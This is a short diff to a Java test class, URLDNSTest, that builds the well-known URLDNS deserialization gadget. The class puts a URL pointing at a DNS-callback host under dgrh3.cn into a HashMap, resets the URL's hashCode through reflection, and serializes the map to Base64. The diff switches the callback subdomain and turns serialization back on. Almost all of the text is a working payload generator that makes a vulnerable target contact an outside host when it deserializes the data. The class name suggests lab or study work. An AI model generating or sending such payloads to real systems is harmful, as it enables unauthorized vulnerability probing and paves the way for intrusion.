@@ -42,7 +42,7 @@ public class URLDNSTest {
 
     public static void main(String[] args) throws Exception{
         HashMap hashMap = new HashMap();
-        URL url = new URL("http://lyvjkhojjz.dgrh3.cn");
+        URL url = new URL("http://rhmenldsww.dgrh3.cn/");
 
         /********反射*******/
         //将hashCode的值不改为*1
@@ -54,7 +54,7 @@ public class URLDNSTest {
 
         hashMap.put(url,1);
         hashcodefield.set(url,-1);//设置hashCode值为-1
-//        serialization(hashMap);
+        serialization(hashMap);
         serializeAndPrintBase64(hashMap);
 //        unserialization();
     }
